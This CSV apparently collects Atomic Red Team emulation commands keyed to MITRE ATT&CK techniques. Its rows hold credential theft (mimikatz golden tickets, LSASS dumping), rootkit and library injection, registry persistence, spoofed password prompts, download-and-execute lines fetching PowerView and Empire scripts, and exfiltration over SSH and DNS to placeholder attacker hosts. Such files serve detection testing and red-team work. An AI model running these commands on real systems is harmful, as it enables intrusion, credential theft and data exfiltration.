mitre_id,technique_name,command
T1489,Windows - Stop service by killing process,taskkill.exe /f /im #{process_name}
T1489,Linux - Stop service using systemctl,sudo systemctl stop #{service_name}
T1489,Linux - Stop service by killing process using killall,sudo killall -sigterm #{process_name}
T1489,Linux - Stop service by killing process using kill,sudo kill -sigterm $(pgrep #{process_name})
T1489,Linux - Stop service by killing process using pkill,sudo pkill -sigterm #{process_pattern}
T1489,Abuse of linux magic system request key for Send a SIGTERM to all processes,"echo ""e"" > /proc/sysrq-trigger"
T1218,Msiexec.exe - Execute Local MSI file with embedded JScript,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with embedded VBScript,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with an embedded DLL,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,Msiexec.exe - Execute Local MSI file with an embedded EXE,"#{msi_exe} /q /#{action} ""#{msi_payload}"""
T1218,WMI Win32_Product Class - Execute Local MSI file with embedded JScript,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,invoke-cimmethod -classname win32_product -methodname #{action} -arguments @{ packagelocation = '#{msi_payload}' }
T1218,Msiexec.exe - Execute the DllRegisterServer function of a DLL,"#{msi_exe} /y ""#{dll_payload}"""
T1218,Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"#{msi_exe} /z ""#{dll_payload}"""
T1218,Msiexec.exe - Execute Remote MSI file,"#{msi_exe} /q /i ""#{msi_payload}"""
T1526,Azure - Dump Subscription Data with MicroBurst,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose"
T1526,AWS - Enumerate common cloud services,"import-module ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1"" $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $regions = ""#{regions}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile get-awsdiscoverydata -regions $regions -outputdirectory ""#{output_directory}"" remove-blankfiles -outputdirectory ""#{output_directory}"""
T1526,Azure - Enumerate common cloud services,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""#{client_id}"" $client_secret = ""#{client_secret}"" $tenant_id = ""#{tenant_id}"" $environment = ""#{cloud}"" set-azureauthentication -clientid $client_id -clientsecret $client_secret -tenantid $tenant_id -environment $environment get-azurediscoverydata -outputdirectory ""#{output_directory}"" -environment $environment remove-blankfiles -outputdirectory ""#{output_directory}"""
T1649,Staging Local Certificates via Export-Certificate,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1566,Download Macro-Enabled Phishing Attachment,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1566.001/bin/phishingattachment.xlsm' [net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 invoke-webrequest -uri $url -outfile $env:temp\phishingattachment.xlsm
T1566,Word spawned a command shell and used an IP address in the command line,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""ping 8.8.8.8`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1090,Psiphon,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"""
T1090,Tor Proxy Usage - Windows,"invoke-expression 'cmd /c start powershell -command {cmd /c ""#{torexe}""}' sleep -s 60 stop-process -name ""tor"" | out-null"
T1090,Tor Proxy Usage - Debian/Ubuntu/FreeBSD,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor"
T1090,Tor Proxy Usage - MacOS,"osascript -e 'tell application ""terminal"" to do script ""tor""'"
T1558,Crafting Active Directory golden tickets with mimikatz,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""#{domain_sid}"" if ($domain_sid -match ""default"") { # code from https://www.sevecek.com/englishpages/lists/posts/post.aspx?id=60 $domain = gwmi win32_computersystem | select -expand domain $krbtgtsid = (new-object security.principal.ntaccount $domain\krbtgt).translate([security.principal.securityidentifier]).value $domain_sid = $krbtgtsid.substring(0, $krbtgtsid.lastindexof('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:domain_sid /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt"" ""exit"" echo. echo requesting sysvol: dir \\#{domain}\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""domain_sid"", $domain_sid | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1558,Crafting Active Directory golden tickets with Rubeus,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore cmd.exe /c ""#{local_folder}\#{local_executable}"" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden $filename = (get-childitem | ? {$_.name.startswith(""golden_"")} | sort-object -descending -property lastwritetime | select -first 1).name # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\golden.txt 2>&1 ( echo purge existing tickets and create golden ticket: klist purge cd %temp% ""#{local_folder}\#{local_executable}"" ptt /ticket:kirbifile echo. echo requesting sysvol: dir \\$(#{domaincontroller})\sysvol echo. echo tickets after requesting sysvol: klist echo. echo end of golden ticket attack ) ""@ -replace ""kirbifile"", $filename | out-file -encoding oem $env:temp\golden.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\golden.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\golden.txt"" -wait | foreach-object { if ($_ -match 'end of golden ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1014,Loadable Kernel Module based Rootkit,sudo insmod #{rootkit_path}/#{rootkit_name}.ko
T1014,Loadable Kernel Module based Rootkit,sudo modprobe #{rootkit_name}
T1014,dynamic-linker based rootkit (libprocesshider),"echo #{library_path} | tee -a /etc/ld.so.preload /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden"""
T1014,Loadable Kernel Module based Rootkit (Diamorphine),"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden"""
T1566,Paste and run technique,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"")"
T1574,Shared Library Injection via /etc/ld.so.preload,sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
T1574,Shared Library Injection via LD_PRELOAD,ld_preload=#{path_to_shared_library} ls
T1574,Dylib Injection via DYLD_INSERT_LIBRARIES,dyld_insert_libraries=#{dylib_file} #{file_to_inject}
T1547,Winlogon Shell Key Persistence - PowerShell,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1547,Winlogon Userinit Key Persistence - PowerShell,"set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, #{binary_to_execute}"" -force"
T1547,Winlogon Notify Key Logon Persistence - PowerShell,"new-item ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""dllname"" ""#{binary_to_execute}"" -type expandstring -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""logon"" ""#{function_to_execute}"" -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""impersonate"" 1 -type dword -force set-itemproperty ""hkcu:\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam"" ""asynchronous"" 0 -type dword -force"
T1547,Winlogon HKLM Shell Key Persistence - PowerShell,"set-itemproperty ""hklm:\software\microsoft\windows nt\currentversion\winlogon\"" ""shell"" ""explorer.exe, #{binary_to_execute}"" -force"
T1547,Winlogon HKLM Userinit Key Persistence - PowerShell,"set-itemproperty ""hklm:\software\microsoft\windows nt\currentversion\winlogon\"" ""userinit"" ""userinit.exe, #{binary_to_execute}"" -force"
T1025,Identify Documents on USB and Removable Media via PowerShell,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1578,AWS - Create Snapshot from EBS Volume,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1578,Azure - Create Snapshot from Managed Disk,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1578,GCP - Create Snapshot from Persistent Disk,gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}
T1580,AWS - EC2 Enumeration from Cloud Instance,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1580,AWS - EC2 Security Group Enumeration,aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}
T1056,AppleScript - Prompt User for Password,"osascript -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to activate' -e 'tell app ""system preferences"" to display dialog ""software update requires that you type your password to apply changes."" & return & return default answer """" with icon 1 with hidden answer with title ""software update""'"
T1056,PowerShell - Prompt User for Password,"# creates gui to prompt for password. expect long pause before prompt is available. $cred = $host.ui.promptforcredential('windows security update', '',[environment]::username, [environment]::userdomainname) # using write-warning to allow message to show on console as echo and other similar commands are not visable from the invoke-atomictest framework. write-warning $cred.getnetworkcredential().password"
T1056,AppleScript - Spoofing a credential prompt using osascript,"pwd_spoof=$(osascript -e 'display dialog ""to perform a security update macos needs your passphrase."" with title ""macos security update"" default answer """" with icon stop with hidden answer') echo $pwd_spoof"
T1048,Exfiltration Over Alternative Protocol - SSH,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz"
T1048,Exfiltration Over Alternative Protocol - SSH,tar czpf - /users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /users.tar.gz.enc'
T1048,DNSExfiltration (doh),"import-module ""#{ps_module}"" invoke-dnsexfiltrator -i ""#{ps_module}"" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}"
T1048,Exfiltrate Data using DNS Queries via dig,"dig @#{attacker_dns_server} -p #{dns_port} $(echo ""#{secret_info}"" | base64).google.com"
T1033,System Owner/User Discovery,"cmd.exe /c whoami wmic useraccount get /all quser /server:""#{computer_name}"" quser qwinsta.exe /server:#{computer_name} qwinsta.exe for /f ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt @for /f %n in (computers.txt) do @for /f ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt"
T1033,System Owner/User Discovery,users w who
T1033,Find computers where user has session - Stealth mode (PowerView),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-userhunter -stealth -verbose
T1033,User Discovery With Env Vars PowerShell Script,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append
T1033,GetCurrent User with PowerShell Script,[system.security.principal.windowsidentity]::getcurrent() | out-file -filepath .\currentuserobject.txt
T1033,System Discovery - SocGholish whoami,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file"
T1033,System Owner/User Discovery Using Command Prompt,set file=#{output_file_path}\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1027,Binary simply packed by UPX (linux),cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,"Binary packed by UPX, with modified headers (linux)",cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,Binary simply packed by UPX,cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1027,"Binary packed by UPX, with modified headers",cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1055,Shellcode execution via VBA,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""#{txt_path}"" -officeproduct ""word"" -sub ""execute"""
T1055,Remote Process Injection in LSASS via mimikatz,"""#{psexec_path}"" /accepteula \\#{machine} -c #{mimikatz_path} ""lsadump::lsa /inject /id:500"" ""exit"""
T1055,Section View Injection,"$notepad = start-process notepad -passthru start-process ""$pathtoatomicsfolder\t1055\bin\x64\injectview.exe"""
T1055,Dirty Vanity process Injection,"start-process ""$pathtoatomicsfolder\t1055\bin\x64\redvanity.exe"" #{pid}"
T1055,Read-Write-Execute process Injection,"$address = (& ""$pathtoatomicsfolder\t1055\bin\x64\searchvuln.exe"" ""$pathtoatomicsfolder\t1055\bin\x64\vuln_dll\"" | out-string | select-string -pattern ""virtualaddress: (\w+)"").matches.groups[1].value & ""pathtoatomicsfolder\t1055\bin\x64\rwxinjectionlocal.exe"" ""#{vuln_dll}"" $address"
T1055,Process Injection with Go using UuidFromStringA WinAPI,$pathtoatomicsfolder\t1055\bin\x64\uuidfromstringa.exe -debug
T1055,Process Injection with Go using EtwpCreateEtwThread WinAPI,$pathtoatomicsfolder\t1055\bin\x64\etwpcreateetwthread.exe -debug
T1055,Remote Process Injection with Go using RtlCreateUserThread WinAPI,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\rtlcreateuserthread.exe -pid $process.id -debug
T1055,Remote Process Injection with Go using CreateRemoteThread WinAPI,$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethread.exe -pid $process.id -debug
T1055,Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),$process = start-process #{spawn_process_path} -passthru $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe -pid $process.id -debug
T1055,Process Injection with Go using CreateThread WinAPI,$pathtoatomicsfolder\t1055\bin\x64\createthread.exe -debug
T1055,Process Injection with Go using CreateThread WinAPI (Natively),$pathtoatomicsfolder\t1055\bin\x64\createthreadnative.exe -debug
T1055,UUID custom process Injection,"start-process ""#{exe_binary}"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1548,Make and modify binary from C source,cp #{payload} /tmp/hello.c sudo chown root /tmp/hello.c sudo make /tmp/hello sudo chown root /tmp/hello sudo chmod u+s /tmp/hello /tmp/hello
T1548,Make and modify binary from C source (freebsd),cp #{payload} /tmp/hello.c chown root /tmp/hello.c make /tmp/hello chown root /tmp/hello chmod u+s /tmp/hello /tmp/hello
T1548,Set a SetUID flag on file,sudo touch #{file_to_setuid} sudo chown root #{file_to_setuid} sudo chmod u+xs #{file_to_setuid}
T1548,Set a SetUID flag on file (freebsd),touch #{file_to_setuid} chown root #{file_to_setuid} chmod u+xs #{file_to_setuid}
T1548,Set a SetGID flag on file,sudo touch #{file_to_setuid} sudo chown root #{file_to_setuid} sudo chmod g+xs #{file_to_setuid}
T1548,Set a SetGID flag on file (freebsd),touch #{file_to_setuid} chown root #{file_to_setuid} chmod g+xs #{file_to_setuid}
T1548,Make and modify capabilities of a binary,cp #{payload} /tmp/cap.c make /tmp/cap sudo setcap cap_setuid=ep /tmp/cap /tmp/cap
T1548,Provide the SetUID capability to a file,touch #{file_to_setcap} sudo setcap cap_setuid=ep #{file_to_setcap}
T1548,Do reconnaissance for files that have the setuid bit set,find /usr/bin -perm -4000
T1548,Do reconnaissance for files that have the setgid bit set,find /usr/bin -perm -2000
T1120,Win32_PnPEntity Hardware Inventory,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt"
T1120,WinPwn - printercheck,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') printercheck -noninteractive -consoleoutput
T1120,Peripheral Device Discovery via fsutil,fsutil fsinfo drives
T1120,Get Printer Device List via PowerShell Command,get-printer
T1491,Replace Desktop Wallpaper,"$url = ""#{url_of_wallpaper}"" $imglocation = ""#{wallpaper_location}"" $orgwallpaper = (get-itemproperty -path registry::'hkey_current_user\control panel\desktop\' -name wallpaper).wallpaper $orgwallpaper | out-file -filepath ""#{pointer_to_orginal_wallpaper}"" $updatewallpapercode = @' using system.runtime.interopservices; namespace win32{ public class wallpaper{ [dllimport(""user32.dll"", charset=charset.auto)] static extern int systemparametersinfo (int uaction , int uparam , string lpvparam , int fuwinini) ; public static void setwallpaper(string thepath){ systemparametersinfo(20,0,thepath,3); } } } '@ $wc = new-object system.net.webclient try{ $wc.downloadfile($url, $imglocation) add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } catch [system.net.webexception]{ write-host(""cannot download $url"") add-type $updatewallpapercode [win32.wallpaper]::setwallpaper($imglocation) } finally{ $wc.dispose() }"
T1491,Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""#{legal_notice_caption}"" $newlegalnoticetext = ""#{legal_notice_text}"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force"
T1491,ESXi - Change Welcome Message on Direct Console User Interface (DCUI),"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1491,Windows - Display a simulated ransom note via Notepad (non-destructive),"$notepath = join-path $env:temp ""#{note_filename}"" $pidpath = join-path $env:temp ""#{pid_filename}"" $title = ""#{note_title}"" $body = ""#{note_body}"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1134,Named pipe client impersonation,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique namedpipe -verbose
T1134,`SeDebugPrivilege` token duplication,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/bc-security/empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/get-system.ps1' -usebasicparsing); get-system -technique token -verbose
T1134,Launch NSudo Executable,"start-process ""#{nsudo_path}"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue"
T1134,Bad Potato,"cd ""pathtoatomicsfolder\..\externalpayloads"" start-process .\badpotato.exe notepad.exe start-sleep -second 20 stop-process -name ""notepad"" -force -erroraction silentlycontinue stop-process -name ""badpotato"" -force -erroraction silentlycontinue"
T1134,Juicy Potato,cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_clsid}'
T1012,Query Registry,"reg query ""hklm\software\microsoft\windows nt\currentversion\windows"" reg query hklm\software\microsoft\windows\currentversion\runservicesonce reg query hkcu\software\microsoft\windows\currentversion\runservicesonce reg query hklm\software\microsoft\windows\currentversion\runservices reg query hkcu\software\microsoft\windows\currentversion\runservices reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\notify"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\userinit"" reg query ""hkcu\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query hklm\software\microsoft\windows\currentversion\shellserviceobjectdelayload reg query hklm\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\runonceex reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\policies\explorer\run reg query hkcu\software\microsoft\windows\currentversion\policies\explorer\run reg query hklm\system\currentcontrolset\services /s | findstr imagepath 2>nul | findstr /ri "".*\.sys$"" reg query hklm\software\microsoft\windows\currentversion\run reg query hklm\system\currentcontrolset\control\safeboot reg query ""hklm\software\microsoft\active setup\installed components"" reg query ""hklm\software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1012,Query Registry with Powershell cmdlets,"get-item -path ""hklm:software\microsoft\windows nt\currentversion\windows"" get-childitem -path ""hklm:software\microsoft\windows nt\currentversion\"" | findstr windows get-item -path ""hklm:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservicesonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runservices"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runservices"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\notify"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\userinit"" get-item -path ""hkcu:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows nt\currentversion\winlogon\\shell"" get-item -path ""hklm:software\microsoft\windows\currentversion\shellserviceobjectdelayload"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\runonceex"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\runonce"" get-item -path ""hklm:software\microsoft\windows\currentversion\policies\explorer\run"" get-item -path ""hkcu:software\microsoft\windows\currentversion\policies\explorer\run"" get-childitem -path ""hklm:system\currentcontrolset\services"" get-item -path ""hklm:software\microsoft\windows\currentversion\run"" get-item -path ""hklm:system\currentcontrolset\control\safeboot"" get-childitem -path ""hklm:software\microsoft\active setup\installed components"" get-childitem -path ""hklm:software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1012,Enumerate COM Objects in Registry with Powershell,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file #{output_file} -append write-output $($clsid)| out-file #{output_file} -append $handle=[activator]::createinstance([type]::gettypefromclsid($clsid)) $handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append $position += 1} catch{}}"
T1012,Reg query for AlwaysInstallElevated status,reg query hkcu\software\policies\microsoft\windows\installer /v alwaysinstallelevated reg query hklm\software\policies\microsoft\windows\installer /v alwaysinstallelevated
T1012,Check Software Inventory Logging (SIL) status via Registry,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
T1012,Inspect SystemStartOptions Value in Registry,reg.exe query hklm\system\currentcontrolset\control /v systemstartoptions
